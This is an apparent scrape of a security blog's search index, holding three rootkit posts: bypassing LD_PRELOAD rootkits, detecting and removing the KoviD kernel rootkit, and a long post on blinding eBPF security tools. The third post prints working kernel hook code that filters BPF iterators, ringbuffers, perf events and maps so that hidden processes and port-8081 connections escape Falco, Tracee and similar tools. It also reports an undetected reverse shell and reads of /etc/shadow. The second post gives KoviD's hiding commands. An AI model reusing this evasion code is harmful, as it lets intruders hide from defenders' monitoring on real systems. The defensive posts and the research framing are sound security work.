customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security has evolved dramatically. eBPF-based security solutions like Falco, Tracee, Tetragon, and others promised a new era of kernel-level observability that would make rootkits obsolete. The premise was compelling: if you can see everything happening in the kernel, attackers have nowhere to hide.\nThat premise was wrong.\nThis article demonstrates how a kernel module with root privileges can systematically blind eBPF security tools by hooking the very mechanisms they rely on for observability. We present a comprehensive analysis of how modern rootkits can intercept BPF iterators, ringbuffers, perf events, and map operations to become completely invisible to runtime security monitoring.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And several other things.\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And several other things.\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nBPF Iterators Can Be Filtered: Tools like GhostScan and Decloaker that enumerate kernel objects can be defeated by hooking bpf_iter_run_prog()\nRingbuffers Can Be Intercepted: Falco and Tracee\u0026rsquo;s event streams can be selectively filtered by hooking ringbuffer operations\nPerf Events Can Be Blocked: Legacy monitoring tools using perf events are equally vulnerable\nBPF Maps Can Be Manipulated: Security tools that track state in BPF maps can operate on incomplete data\nFtrace Enables Invisible Hooks: Hooking via ftrace allows interception without modifying kernel code or using obvious techniques like syscall table hooking\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca 